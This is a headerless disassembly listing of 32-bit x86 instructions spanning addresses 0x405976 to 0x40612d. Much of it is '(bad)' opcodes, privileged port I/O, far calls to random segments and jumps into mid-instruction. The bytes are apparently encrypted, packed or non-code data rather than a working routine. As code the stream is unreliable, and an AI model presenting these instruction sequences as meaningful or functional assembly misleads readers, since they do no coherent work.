  405976:	lea    edx,[ebp+0x24bfe28b]
  40597c:	add    al,0x5b
  40597e:	sub    DWORD PTR [edi+0x4b],edx
  405981:	repnz xlat BYTE PTR ds:[ebx]
  405983:	and    al,0xc0
  405985:	imul   ecx,edx,0x3dfbdb5e
  40598b:	mov    ebp,0x520a00d1
  405990:	mov    dh,0x89
  405992:	cmp    eax,0xac821558
  405997:	lahf   
  405998:	scas   al,BYTE PTR es:[edi]
  405999:	in     eax,dx
  40599a:	dec    ebp
  40599b:	(bad)  
  40599c:	mov    esp,0x4606edda
  4059a1:	data16 xor cl,BYTE PTR [ecx+0x1b]
  4059a5:	add    DWORD PTR [ecx],esi
  4059a7:	jg     0x405955
  4059a9:	sub    esi,edx
  4059ab:	fdiv   DWORD PTR [esi-0x59657f60]
  4059b1:	(bad)  
  4059b3:	jge    0x405965
  4059b5:	inc    ebp
  4059b6:	rcl    cl,cl
  4059b8:	pop    ebp
  4059b9:	mov    DWORD PTR [edi+0x9],edi
  4059bc:	xchg   ebp,eax
  4059bd:	xchg   DWORD PTR [edi+0x10022b35],esp
  4059c3:	pop    ecx
  4059c4:	mov    ebp,0xe3665525
  4059c9:	(bad)  
  4059ca:	mov    esp,0x94c4da1e
  4059cf:	popf   
  4059d0:	inc    ecx
  4059d1:	pop    eax
  4059d2:	fst    DWORD PTR [eax]
  4059d4:	repz xor al,0xc4
  4059d7:	fiadd  WORD PTR [ebx]
  4059d9:	(bad)  
  4059da:	push   ss
  4059db:	dec    esp
  4059dc:	mov    esi,DWORD PTR [edi-0x5e]
  4059df:	sub    al,0x2d
  4059e1:	lods   eax,DWORD PTR ds:[esi]
  4059e2:	repz or si,WORD PTR [ebp+ebx*4+0xe]
  4059e8:	ret    0x8b1d
  4059eb:	mov    DWORD PTR [eax],eax
  4059ed:	and    eax,0x6f3b35db
  4059f2:	call   0x2a1c:0xf8d1d85e
  4059f9:	push   esp
  4059fa:	fist   DWORD PTR [edi+0x6d]
  4059fd:	xchg   edx,eax
  4059fe:	xor    eax,DWORD PTR [ebp+0x58]
  405a01:	hlt    
  405a02:	cdq    
  405a03:	aaa    
  405a04:	mov    ch,0x5a
  405a06:	and    ecx,ebx
  405a08:	inc    ecx
  405a09:	mov    esp,0x9c3099bd
  405a0e:	mov    DWORD PTR [edx+esi*1+0x7c2f8909],esi
  405a15:	ror    BYTE PTR [ebp-0x61fbefa0],cl
  405a1b:	inc    ebx
  405a1c:	sahf   
  405a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a1e:	popf   
  405a1f:	pusha  
  405a20:	inc    esp
  405a21:	fild   QWORD PTR [edx]
  405a23:	(bad)  [edi]
  405a25:	js     0x4059aa
  405a27:	mov    edi,0x6d32534e
  405a2c:	fdivp  st(6),st
  405a2e:	mov    ebx,0x397a1fae
  405a33:	(bad)  
  405a34:	pop    eax
  405a35:	ja     0x405a9c
  405a37:	lea    edi,[ebp+0x40]
  405a3a:	add    esi,DWORD PTR [ecx-0x1e248f14]
  405a40:	stos   DWORD PTR es:[edi],eax
  405a41:	dec    edi
  405a42:	scas   al,BYTE PTR es:[edi]
  405a43:	fisubr WORD PTR [ecx+0x2e2ea71c]
  405a49:	scas   al,BYTE PTR es:[edi]
  405a4a:	in     eax,dx
  405a4b:	retf   0xde3a
  405a4e:	cwde   
  405a4f:	test   BYTE PTR [edi],dh
  405a51:	loopne 0x405a39
  405a53:	mov    ds:0xf7acc6f4,al
  405a58:	fnstsw ax
  405a5a:	(bad)  
  405a5b:	push   ecx
  405a5c:	retf   
  405a5d:	and    ebp,eax
  405a5f:	pop    ecx
  405a60:	addr16 mov eax,0x924f8c86
  405a66:	xchg   esi,eax
  405a67:	je     0x405a22
  405a69:	mov    bl,0x63
  405a6b:	hlt    
  405a6c:	jnp    0x405a7d
  405a6e:	(bad)  
  405a6f:	mov    al,0xb2
  405a71:	dec    ebx
  405a72:	mov    ebp,0x304efb5
  405a77:	sbb    ebx,eax
  405a79:	and    dh,ah
  405a7b:	add    edx,DWORD PTR [esi+0xe]
  405a7e:	add    eax,0x3d098fbb
  405a83:	ret    0x4722
  405a86:	pop    edi
  405a87:	push   edi
  405a88:	stc    
  405a89:	jecxz  0x405a66
  405a8b:	xor    al,0xbf
  405a8d:	pop    eax
  405a8e:	fdiv   st,st(5)
  405a90:	mov    ebp,0x19a40341
  405a95:	icebp  
  405a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a97:	call   0x53a22d70
  405a9c:	push   esi
  405a9d:	mov    ecx,0x1d150ece
  405aa2:	or     al,0xb6
  405aa4:	xor    BYTE PTR [edi],ah
  405aa6:	mov    ebx,eax
  405aa8:	inc    ebx
  405aa9:	or     al,0x74
  405aab:	sahf   
  405aac:	xor    al,0xbc
  405aae:	xchg   edi,eax
  405aaf:	jg     0x405a62
  405ab1:	pop    esp
  405ab2:	cmp    ch,BYTE PTR [ebx-0x74]
  405ab5:	inc    ebx
  405ab6:	nop
  405ab7:	cld    
  405ab8:	test   DWORD PTR [ebx+eax*4+0x38],eax
  405abc:	jl     0x405a57
  405abe:	pop    ebp
  405abf:	xor    esi,DWORD PTR [esi+0x474cb518]
  405ac5:	icebp  
  405ac6:	mov    ch,0x49
  405ac8:	outs   dx,BYTE PTR ds:[esi]
  405ac9:	in     eax,dx
  405aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405acb:	sub    BYTE PTR [ebp+0x7b],bl
  405ace:	and    DWORD PTR [edx],edi
  405ad0:	iret   
  405ad1:	sbb    eax,0x23471226
  405ad6:	sar    DWORD PTR [esi],1
  405ad8:	add    al,0xaf
  405ada:	add    ebx,edx
  405adc:	dec    edx
  405add:	and    eax,0x9be79b2e
  405ae2:	shr    BYTE PTR [eax],1
  405ae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ae5:	sbb    al,0x4a
  405ae7:	mov    edi,0xf46a0e32
  405aec:	or     BYTE PTR [edx+0x75],0xaa
  405af0:	aas    
  405af1:	popf   
  405af2:	out    0xec,al
  405af4:	sub    edi,DWORD PTR [esi+0x3b3036f2]
  405afa:	mov    esp,0x4d1158bb
  405aff:	push   ss
  405b00:	mov    esp,0x40e4321e
  405b05:	mov    eax,0x727ed5d3
  405b0a:	stos   BYTE PTR es:[edi],al
  405b0b:	shr    BYTE PTR [edx+0x44],1
  405b0e:	inc    ecx
  405b0f:	aas    
  405b10:	jecxz  0x405abd
  405b12:	mov    DWORD PTR [edx+0x484e6b5c],ebp
  405b18:	fwait
  405b19:	cmp    cl,BYTE PTR [edx+0x73be3530]
  405b1f:	dec    edx
  405b20:	out    dx,al
  405b21:	in     al,0xd1
  405b23:	mov    eax,0x429aa755
  405b28:	jle    0x405ac6
  405b2a:	and    DWORD PTR [edi+0x19],ecx
  405b2d:	jmp    0x31eb78dc
  405b32:	mov    ebp,0xc2fc1a75
  405b37:	pop    esi
  405b38:	pushf  
  405b39:	(bad)  
  405b3a:	jnp    0x405b4f
  405b3c:	cdq    
  405b3d:	lds    esi,FWORD PTR [ebx+eiz*2]
  405b40:	jno    0x405b66
  405b42:	int3   
  405b43:	push   cs
  405b44:	idiv   ecx
  405b46:	sub    BYTE PTR [edx+0x1f],al
  405b49:	mov    esp,0x839d009d
  405b4e:	pop    ebx
  405b4f:	adc    al,0x6e
  405b51:	sbb    al,0xb0
  405b53:	pop    es
  405b54:	int3   
  405b55:	aaa    
  405b56:	inc    edi
  405b57:	sti    
  405b58:	mov    ah,0xbd
  405b5a:	mov    ss,edx
  405b5c:	jo     0x405af3
  405b5e:	lock mov BYTE PTR [ebx-0xb97442c],dl
  405b65:	std    
  405b66:	mov    WORD PTR [eax+0x522abb86],fs
  405b6c:	mov    dh,0xa
  405b6e:	fs push ds
  405b70:	std    
  405b71:	shl    esi,1
  405b73:	pop    eax
  405b74:	xor    eax,0x33ccb94a
  405b79:	ret    0xc2a3
  405b7c:	inc    esp
  405b7d:	jmp    0x405be4
  405b7f:	add    ch,BYTE PTR [edi-0x26]
  405b82:	mov    edx,DWORD PTR [edx]
  405b84:	retf   0x2457
  405b87:	pusha  
  405b88:	sar    BYTE PTR [ebx+0x8],1
  405b8b:	inc    ah
  405b8d:	gs mov ebx,0xf21af706
  405b93:	sbb    al,0xae
  405b95:	in     al,0x78
  405b97:	cmp    esi,DWORD PTR [ebx+0x1e]
  405b9a:	xchg   ecx,eax
  405b9b:	aaa    
  405b9c:	mov    ebp,0x4ad1d454
  405ba1:	xlat   BYTE PTR ds:[ebx]
  405ba2:	lock rcl BYTE PTR [ecx+edx*8-0x67],0x68
  405ba8:	loope  0x405b58
  405baa:	mov    ebp,0xa0e61ea0
  405baf:	add    ch,bh
  405bb1:	ins    BYTE PTR es:[edi],dx
  405bb2:	sub    eax,0xeab7b0bc
  405bb7:	adc    BYTE PTR [ebp+0x684e2faf],dl
  405bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bbe:	inc    ebx
  405bbf:	repz ret 
  405bc1:	pop    ss
  405bc2:	dec    esi
  405bc3:	jge    0x405c1f
  405bc5:	clc    
  405bc6:	or     DWORD PTR [ecx],esp
  405bc8:	ja     0x405b94
  405bca:	es push edx
  405bcc:	ds cmp eax,0xd677b649
  405bd2:	int    0xfa
  405bd4:	lods   al,BYTE PTR ds:[si]
  405bd6:	dec    eax
  405bd7:	out    dx,al
  405bd8:	dec    ebx
  405bd9:	outs   dx,DWORD PTR ds:[esi]
  405bda:	mov    esi,0xc10d86fc
  405bdf:	mov    cl,0x5
  405be1:	ja     0x405c1d
  405be3:	inc    esp
  405be4:	aam    0x91
  405be6:	jno    0x405b84
  405be8:	pop    esi
  405be9:	jae    0x405c4a
  405beb:	adc    bh,BYTE PTR [edi+0x36721b6f]
  405bf1:	mov    al,0xbf
  405bf3:	ja     0x405bed
  405bf5:	lods   al,BYTE PTR ds:[esi]
  405bf6:	je     0x405c5e
  405bf8:	jb     0x405bf2
  405bfa:	push   esp
  405bfb:	loopne 0x405bc7
  405bfd:	cmc    
  405bfe:	int    0xdc
  405c00:	cwde   
  405c01:	xor    BYTE PTR [ecx+edi*1-0x2d],cl
  405c05:	ret    
  405c06:	cmp    eax,0x24b141f4
  405c0b:	stc    
  405c0c:	sub    bl,BYTE PTR [eax+0x73]
  405c0f:	mov    al,ds:0x685020b
  405c14:	dec    edi
  405c15:	ret    0x5bc4
  405c18:	dec    edx
  405c19:	mov    edi,0x665dca19
  405c1e:	enter  0xeb8b,0x86
  405c22:	cwde   
  405c23:	fsubr  QWORD PTR [ebx-0x77]
  405c26:	in     al,0x10
  405c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c29:	push   ss
  405c2a:	jl     0x405c6a
  405c2c:	mov    bl,0x63
  405c2e:	retf   0x72f2
  405c31:	and    edi,edi
  405c33:	scas   al,BYTE PTR es:[edi]
  405c34:	mov    edx,0xb0ae5149
  405c39:	jb     0x405c3b
  405c3b:	jmp    0xda44eda8
  405c40:	push   ss
  405c41:	sahf   
  405c42:	leave  
  405c43:	mov    edx,0x689a727f
  405c48:	(bad)  
  405c49:	ins    DWORD PTR es:[edi],dx
  405c4a:	ins    DWORD PTR es:[edi],dx
  405c4b:	test   DWORD PTR [ebx+0x3c7b2c0],edi
  405c51:	add    al,BYTE PTR [edi-0x6b258592]
  405c57:	xchg   ebp,eax
  405c58:	push   ecx
  405c59:	jl     0x405c7a
  405c5b:	sub    DWORD PTR [edx-0x4],esp
  405c5e:	dec    esp
  405c5f:	jne    0x405bf2
  405c61:	sbb    esp,DWORD PTR [esi]
  405c63:	push   ecx
  405c64:	fdivr  st,st(6)
  405c66:	pop    edx
  405c67:	jge    0x405cbb
  405c69:	dec    esp
  405c6a:	into   
  405c6b:	popa   
  405c6c:	cmc    
  405c6d:	jmp    0x405ccb
  405c6f:	sbb    DWORD PTR [esi+0x63],eax
  405c72:	mov    ds:0xb6353030,al
  405c77:	push   0xffffff95
  405c79:	test   al,0x43
  405c7b:	mov    cl,0xdf
  405c7d:	xchg   esi,eax
  405c7e:	stos   BYTE PTR es:[edi],al
  405c7f:	jo     0x405c91
  405c81:	fisubr WORD PTR [edx+0x3e]
  405c84:	out    0x9e,al
  405c86:	jbe    0x405cde
  405c88:	inc    edi
  405c89:	dec    edx
  405c8a:	pop    ss
  405c8b:	ins    DWORD PTR es:[edi],dx
  405c8c:	popf   
  405c8d:	mov    esp,0xbaf7d670
  405c92:	popf   
  405c93:	push   0x45
  405c95:	fldenv [ecx+0x6b]
  405c98:	add    BYTE PTR [eax-0x5c],bl
  405c9b:	jle    0x405c65
  405c9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c9e:	inc    ecx
  405c9f:	mov    es,ebp
  405ca1:	stc    
  405ca2:	sahf   
  405ca3:	inc    eax
  405ca4:	int    0xa0
  405ca6:	and    eax,0xffa5549f
  405cab:	(bad)  
  405cac:	out    0x7a,al
  405cae:	xchg   ebp,eax
  405caf:	cmp    ah,BYTE PTR [esi+0x55056030]
  405cb5:	pop    ebp
  405cb6:	adc    bh,BYTE PTR [ecx]
  405cb8:	das    
  405cb9:	mov    WORD PTR [esi-0x7220f434],?
  405cbf:	pop    edx
  405cc0:	out    dx,eax
  405cc1:	push   ebp
  405cc2:	sbb    DWORD PTR [ebp+ebp*8+0x508a745b],esi
  405cc9:	and    dl,ah
  405ccb:	mov    bh,0x15
  405ccd:	and    al,0x87
  405ccf:	mov    dh,0x58
  405cd1:	push   eax
  405cd2:	cmc    
  405cd3:	cs icebp 
  405cd5:	out    dx,eax
  405cd6:	inc    ebx
  405cd7:	aad    0x53
  405cd9:	lods   al,BYTE PTR ds:[esi]
  405cda:	(bad)  
  405cdb:	mov    ebp,0x25dfecd4
  405ce0:	jmp    0x41666825
  405ce5:	pop    esi
  405ce6:	xor    ch,dl
  405ce8:	sub    eax,0xd4cb4fd1
  405ced:	stos   BYTE PTR es:[edi],al
  405cee:	pop    esp
  405cef:	shr    BYTE PTR [ebx],0x15
  405cf2:	inc    edx
  405cf3:	sar    DWORD PTR [eax+0x6d],1
  405cf6:	cld    
  405cf7:	jns    0x405d2e
  405cf9:	fmul   DWORD PTR [ebx-0x1f]
  405cfc:	jno    0x405d56
  405cfe:	cmp    al,0x5c
  405d00:	xor    BYTE PTR [ebp-0x66e8673d],dh
  405d06:	sub    BYTE PTR [esi+ecx*8-0x10],ch
  405d0a:	and    DWORD PTR [ecx+ebp*4],esi
  405d0d:	jns    0x405c9f
  405d0f:	mov    al,0x21
  405d11:	arpl   ax,cx
  405d13:	stos   BYTE PTR es:[edi],al
  405d14:	xor    eax,0x738ac0e5
  405d19:	hlt    
  405d1a:	jg     0x405cfd
  405d1c:	and    DWORD PTR [edx+0x1bb674b1],esp
  405d22:	imul   esi,DWORD PTR [ebx],0xfffffff7
  405d25:	int3   
  405d26:	mov    al,ds:0x291b4633
  405d2b:	or     BYTE PTR [esi],bh
  405d2d:	lock xchg dh,ah
  405d30:	jmp    0xe346:0xbf94cb69
  405d37:	and    eax,0xf359c383
  405d3c:	inc    ebp
  405d3d:	inc    eax
  405d3e:	loopne 0x405cc2
  405d40:	pop    ecx
  405d41:	stos   BYTE PTR es:[edi],al
  405d42:	pop    esi
  405d43:	add    BYTE PTR [edi],dh
  405d45:	cmp    ah,BYTE PTR [ebx]
  405d47:	inc    esp
  405d48:	fs mov edx,0xee19902a
  405d4e:	push   esi
  405d4f:	sbb    al,0xbc
  405d51:	hlt    
  405d52:	loope  0x405dc1
  405d54:	jo     0x405d92
  405d56:	fstp   st(3)
  405d58:	push   eax
  405d59:	in     al,0x26
  405d5b:	push   0x7252b5c3
  405d60:	pop    edi
  405d61:	rcl    DWORD PTR [edi],1
  405d63:	js     0x405d0a
  405d65:	arpl   WORD PTR [edi],si
  405d67:	daa    
  405d68:	or     eax,0x88117619
  405d6d:	repz push eax
  405d6f:	dec    esp
  405d70:	mov    eax,0xf74ddb85
  405d75:	in     eax,dx
  405d76:	je     0x405cfb
  405d78:	and    edi,edi
  405d7a:	xchg   esi,eax
  405d7b:	xor    BYTE PTR [di-0x53],dh
  405d7f:	pop    ss
  405d80:	idiv   ebp
  405d82:	rcl    BYTE PTR [esi-0x67],1
  405d85:	mov    dl,BYTE PTR [esi-0x75b46b0c]
  405d8b:	mov    dh,0x12
  405d8d:	cdq    
  405d8e:	fs add eax,0x369d3c5f
  405d94:	jge    0x405e0a
  405d96:	inc    ecx
  405d97:	push   eax
  405d98:	(bad)  
  405d99:	jmp    0x405d9a
  405d9b:	mov    bh,0x76
  405d9d:	mov    al,ds:0x41e41249
  405da2:	cs pop eax
  405da4:	imul   BYTE PTR [ebx-0x3a815955]
  405daa:	loop   0x405de7
  405dac:	mov    al,BYTE PTR [edx+0x3ebb7562]
  405db2:	call   0xd97a:0xd88bc630
  405db9:	leave  
  405dba:	ds aas 
  405dbc:	add    DWORD PTR [edx+0x59],eax
  405dbf:	dec    esp
  405dc0:	imul   ebp,DWORD PTR [ecx+0x3b],0xffffffac
  405dc4:	fldenv [edx+edi*2-0x3e610efa]
  405dcb:	std    
  405dcc:	aam    0x47
  405dce:	sti    
  405dcf:	add    eax,ebp
  405dd1:	enter  0xd639,0x4e
  405dd5:	xor    al,0x4c
  405dd7:	stos   BYTE PTR es:[edi],al
  405dd8:	mov    eax,0xddd6c8da
  405ddd:	adc    dl,ah
  405ddf:	scas   eax,DWORD PTR es:[edi]
  405de0:	call   0x3f32:0xe258b7dc
  405de7:	cwde   
  405de8:	aad    0x1f
  405dea:	push   0xffffffd5
  405dec:	hlt    
  405ded:	xchg   ebx,eax
  405dee:	in     al,0xc6
  405df0:	mov    ecx,ds
  405df2:	(bad)  
  405df3:	inc    eax
  405df4:	lock stos DWORD PTR es:[edi],eax
  405df6:	add    BYTE PTR [ebx],dl
  405df8:	pop    esp
  405df9:	adc    al,0x25
  405dfb:	aaa    
  405dfc:	push   0x723de179
  405e01:	push   0x95e7ba14
  405e06:	jmp    0xf50ff32
  405e0b:	stos   DWORD PTR es:[edi],eax
  405e0c:	pushf  
  405e0d:	inc    ecx
  405e0e:	cmp    BYTE PTR [edi-0x1cabd328],al
  405e14:	mov    WORD PTR [eax+0x7fb1b1fe],gs
  405e1a:	in     eax,dx
  405e1b:	sbb    edx,DWORD PTR [ecx+ebp*4-0x2bd54ae8]
  405e22:	dec    eax
  405e23:	inc    eax
  405e24:	mov    ds,ebp
  405e26:	es push es
  405e28:	cmp    eax,0x125f81e
  405e2d:	(bad)  
  405e2e:	xchg   edi,eax
  405e2f:	sub    DWORD PTR ds:0x9e795165,esi
  405e35:	pop    esp
  405e36:	inc    edx
  405e37:	clc    
  405e38:	jb     0x405e56
  405e3a:	add    al,0x59
  405e3c:	dec    eax
  405e3d:	outs   dx,BYTE PTR ds:[esi]
  405e3e:	ret    
  405e3f:	popfw  
  405e41:	mov    ebx,0x69836b1d
  405e46:	xchg   edx,eax
  405e47:	push   esi
  405e48:	xchg   DWORD PTR [eax+0x7],ebx
  405e4b:	xchg   esp,eax
  405e4c:	mov    eax,0xfcbb6194
  405e51:	or     eax,0xce4fa74
  405e56:	adc    DWORD PTR [esi-0x18],0xd5261edb
  405e5d:	imul   eax,edx,0xffffffc5
  405e60:	mov    esp,0x1e058c68
  405e65:	cld    
  405e66:	test   ebp,esp
  405e68:	pusha  
  405e69:	push   ss
  405e6a:	clc    
  405e6b:	test   DWORD PTR [esi-0x12637],0x1715c01c
  405e75:	mov    bh,0xe9
  405e77:	(bad)  
  405e79:	mov    ebx,0xf1af49d
  405e7e:	lods   eax,DWORD PTR ds:[esi]
  405e7f:	ficom  DWORD PTR [eax+edx*1-0x53]
  405e83:	outs   dx,BYTE PTR ds:[esi]
  405e84:	(bad)  
  405e85:	in     al,dx
  405e86:	(bad)  
  405e87:	or     ebp,esi
  405e89:	rol    BYTE PTR [ebx-0x30],1
  405e8c:	call   0x8cc1:0x6125e6ca
  405e93:	pusha  
  405e94:	fldenv [eax+0x57551865]
  405e9a:	rol    DWORD PTR gs:[ecx-0x47],cl
  405e9e:	sub    eax,0xcbdee89
  405ea3:	pop    ds
  405ea4:	icebp  
  405ea5:	dec    ebp
  405ea6:	call   0xe7b:0xf6cbde9f
  405ead:	out    0xd4,eax
  405eaf:	hlt    
  405eb0:	xlat   BYTE PTR ds:[ebx]
  405eb1:	inc    esi
  405eb2:	mov    ah,0x3c
  405eb4:	cmp    DWORD PTR [esi+0x53],esi
  405eb7:	fld    DWORD PTR [esi+0x4c465126]
  405ebd:	adc    eax,0x254e20ad
  405ec2:	push   0xca6c53a8
  405ec7:	mov    bh,0x74
  405ec9:	test   BYTE PTR [eax-0x33],cl
  405ecc:	pop    ebx
  405ecd:	jnp    0x405e8f
  405ecf:	js     0x405e70
  405ed1:	pop    edx
  405ed2:	sbb    BYTE PTR [ebx+0x5],bh
  405ed5:	cmp    DWORD PTR [edi*2+0x370cad2e],esi
  405edc:	sub    BYTE PTR [edi],0xce
  405edf:	mov    WORD PTR [ebp+0x282c4779],?
  405ee5:	stos   BYTE PTR es:[edi],al
  405ee6:	mov    BYTE PTR [ecx+0x2995ae43],0xd8
  405eed:	cmp    DWORD PTR [ebx],edx
  405eef:	out    dx,eax
  405ef0:	mov    edi,0xd9189b83
  405ef5:	cmp    eax,0x10379b73
  405efa:	ss pop ebx
  405efd:	push   edi
  405efe:	scas   al,BYTE PTR es:[edi]
  405eff:	loop   0x405f3a
  405f01:	cld    
  405f02:	aad    0xcf
  405f04:	std    
  405f05:	xor    al,0xe9
  405f07:	fs adc al,0x6d
  405f0a:	inc    edi
  405f0b:	add    eax,0x9b65d00c
  405f10:	or     eax,0x42498a92
  405f15:	mov    ds:0x785a806c,al
  405f1a:	outs   dx,BYTE PTR ds:[esi]
  405f1b:	add    cl,ch
  405f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f1e:	xlat   BYTE PTR ds:[ebx]
  405f1f:	lahf   
  405f20:	jb     0x405ef4
  405f22:	add    ah,BYTE PTR [ebp-0xce112ca]
  405f28:	push   edi
  405f29:	cwde   
  405f2a:	dec    eax
  405f2b:	cmp    BYTE PTR [edi-0x5b],ch
  405f2e:	pop    esp
  405f2f:	cmp    DWORD PTR fs:0x3bc76b31,eax
  405f36:	fimul  DWORD PTR [edi+0x34]
  405f39:	xor    al,0x6
  405f3b:	ds enter 0xaaff,0xb5
  405f40:	fimul  DWORD PTR [edi]
  405f42:	sbb    edx,DWORD PTR [ebx-0x67]
  405f45:	push   ds
  405f46:	cmp    al,0x10
  405f48:	lahf   
  405f49:	imul   esi,DWORD PTR [eax+0x5a],0x98c90c15
  405f50:	lods   eax,DWORD PTR ds:[esi]
  405f51:	scas   al,BYTE PTR es:[edi]
  405f52:	xor    BYTE PTR [ebx+0x2a],dl
  405f55:	jnp    0x405fad
  405f57:	lock outs dx,BYTE PTR ds:[esi]
  405f59:	scas   eax,DWORD PTR es:[edi]
  405f5a:	mov    ebp,0xb4b1944e
  405f5f:	adc    DWORD PTR [edi+edi*8],esp
  405f62:	imul   ebx,DWORD PTR gs:[eax+0x2c],0x6b
  405f67:	call   0xf479:0x5906ffd8
  405f6e:	sbb    BYTE PTR [edi-0x27],ch
  405f71:	cwde   
  405f72:	pop    edx
  405f73:	push   eax
  405f74:	cld    
  405f75:	call   0xc334:0xaafc30ac
  405f7c:	push   esp
  405f7d:	push   0xf3e92df3
  405f82:	ds xchg ecx,eax
  405f84:	xchg   BYTE PTR [edi],dh
  405f86:	fisttp QWORD PTR cs:[ebx+0x31a591df]
  405f8d:	out    0x26,eax
  405f8f:	or     DWORD PTR [edi-0x100e5983],edx
  405f95:	sub    BYTE PTR [eax-0x64e7cb90],cl
  405f9b:	push   edx
  405f9c:	jns    0x405fdd
  405f9e:	xor    DWORD PTR [ebp-0x77],eax
  405fa1:	pop    edi
  405fa2:	(bad)  
  405fa3:	(bad)  
  405fa5:	mov    gs,WORD PTR [edi-0x2d]
  405fa8:	cld    
  405fa9:	cli    
  405faa:	jnp    0x405ff2
  405fac:	mov    edx,0xa0b966a9
  405fb1:	popf   
  405fb2:	push   cs
  405fb3:	jb     0x40601a
  405fb5:	jmp    0xd0cead82
  405fba:	push   cs
  405fbb:	xor    BYTE PTR [edi],dh
  405fbd:	dec    ebx
  405fbe:	cli    
  405fbf:	ja     0x405f58
  405fc1:	xor    ebp,ebp
  405fc3:	cdq    
  405fc4:	enter  0xcc96,0x60
  405fc8:	xlat   BYTE PTR ds:[ebx]
  405fc9:	enter  0xb6ca,0xdc
  405fcd:	jmp    0xc754294a
  405fd2:	mov    al,ds:0xc4637b95
  405fd7:	mov    DWORD PTR [ecx+0x45ff5334],esi
  405fdd:	stc    
  405fde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fdf:	daa    
  405fe0:	retf   
  405fe1:	loopne 0x40603c
  405fe3:	or     ah,BYTE PTR [ebp+edi*4-0x6]
  405fe7:	ds cwde 
  405fe9:	jae    0x405fa3
  405feb:	int3   
  405fec:	adc    dh,BYTE PTR [esi+0x4e6c09e5]
  405ff2:	ds out dx,al
  405ff4:	mov    ds:0x9950c70f,eax
  405ff9:	add    dh,BYTE PTR [eax]
  405ffb:	xchg   edi,eax
  405ffc:	into   
  405ffd:	ds mov dl,0x4b
  406000:	dec    ebp
  406001:	dec    ebp
  406002:	dec    edx
  406003:	dec    esi
  406004:	jmp    0x405f88
  406006:	sub    ebx,DWORD PTR [esp+edx*2+0xd]
  40600a:	lea    edi,[ecx+0x20]
  40600d:	jecxz  0x40605f
  40600f:	in     eax,dx
  406010:	xor    DWORD PTR [ebp-0x27],ebx
  406013:	dec    ecx
  406014:	cld    
  406015:	adc    DWORD PTR [ebp+0x53],0x69
  406019:	data16 jbe 0x406041
  40601c:	jmp    0xebf367fa
  406021:	cmp    al,BYTE PTR [ebx]
  406023:	push   es
  406024:	or     edx,edi
  406026:	dec    esp
  406028:	inc    eax
  406029:	in     al,dx
  40602a:	out    dx,al
  40602b:	fisubr DWORD PTR [ecx-0x37]
  40602e:	xor    DWORD PTR [edx-0x6],ecx
  406031:	lods   eax,DWORD PTR ds:[esi]
  406032:	cli    
  406033:	popa   
  406034:	push   edi
  406035:	inc    edx
  406036:	sti    
  406037:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  406039:	into   
  40603a:	sahf   
  40603b:	mov    eax,0x8dc5a755
  406040:	out    0x69,eax
  406042:	cs jl  0x406045
  406045:	inc    ebx
  406046:	sbb    DWORD PTR [edi],0xffffffa0
  406049:	(bad)  
  40604a:	jmp    0x37eb9a7a
  40604f:	add    dh,ah
  406051:	sbb    BYTE PTR [esp+ebp*4],bh
  406054:	mov    ebp,0x99c70503
  406059:	daa    
  40605a:	cli    
  40605b:	mov    BYTE PTR [eax-0x21],dl
  40605e:	rol    DWORD PTR [edx+0x60],cl
  406061:	test   DWORD PTR [edi],edx
  406063:	xor    DWORD PTR [ebp+0x54c50024],edx
  406069:	retf   
  40606a:	push   edi
  40606b:	pop    ebx
  40606c:	imul   ebp,DWORD PTR [eax+0x44],0x58f56dd4
  406073:	mov    al,ds:0x50c61008
  406078:	adc    al,0x3c
  40607a:	lds    edi,FWORD PTR [ecx-0x18]
  40607d:	sahf   
  40607e:	sbb    BYTE PTR [edi+0x69],bl
  406081:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406082:	xor    BYTE PTR [eax-0x2b],ah
  406085:	dec    esi
  406086:	test   eax,0xd770a20b
  40608b:	mov    ch,0xb0
  40608d:	popf   
  40608e:	pop    edx
  40608f:	xor    BYTE PTR [eax+0x58],0x70
  406093:	mov    eax,0x481236bf
  406098:	cs iret 
  40609a:	pop    ebx
  40609b:	sahf   
  40609c:	jge    0x406033
  40609e:	mov    eax,ds:0x54d98364
  4060a3:	sub    ah,ch
  4060a5:	mov    ecx,0xb99e6ae5
  4060aa:	or     eax,0x413dce84
  4060af:	jmp    0x5661:0xd4c045d4
  4060b6:	(bad)  
  4060b8:	pushf  
  4060b9:	xor    al,0x8f
  4060bb:	mov    ebx,DWORD PTR [esi-0x36]
  4060be:	dec    ecx
  4060bf:	ret    0xb8f6
  4060c2:	pop    ecx
  4060c3:	add    eax,0x4da3039f
  4060c8:	or     eax,0xdaf4bd2a
  4060cd:	jns    0x4060dc
  4060cf:	or     ecx,DWORD PTR [edi]
  4060d1:	dec    ebp
  4060d2:	int    0x64
  4060d4:	pop    ebp
  4060d5:	or     al,0x4b
  4060d7:	add    bl,al
  4060d9:	sbb    ch,al
  4060db:	hlt    
  4060dc:	(bad)  
  4060dd:	outs   dx,DWORD PTR ds:[esi]
  4060de:	repz in eax,0xa4
  4060e1:	xor    al,0x18
  4060e3:	aad    0x2a
  4060e5:	fwait
  4060e6:	push   es
  4060e7:	js     0x4060cc
  4060e9:	mov    ah,0xc2
  4060eb:	push   ss
  4060ec:	test   eax,0x484b67e3
  4060f1:	fcomp  QWORD PTR [edx-0x19735e59]
  4060f7:	mov    fs,eax
  4060f9:	cmp    eax,0xe99ad435
  4060fe:	add    eax,0x661ffc8a
  406103:	mov    dl,0xc
  406105:	jne    0x406179
  406107:	fbld   TBYTE PTR [ebx+eax*8]
  40610a:	push   eax
  40610b:	mov    cs,edi
  40610d:	int    0xa6
  40610f:	xor    al,0x7f
  406111:	adc    BYTE PTR [ecx+0x52660e4b],ch
  406117:	std    
  406118:	div    DWORD PTR [ecx+0x63]
  40611b:	int    0x75
  40611d:	clc    
  40611e:	jg     0x406129
  406120:	inc    edi
  406121:	jno    0x4060ff
  406123:	out    dx,eax
  406124:	jecxz  0x4060ee
  406126:	ficom  DWORD PTR es:[ebp-0x117aac21]
  40612d:	push   ebp
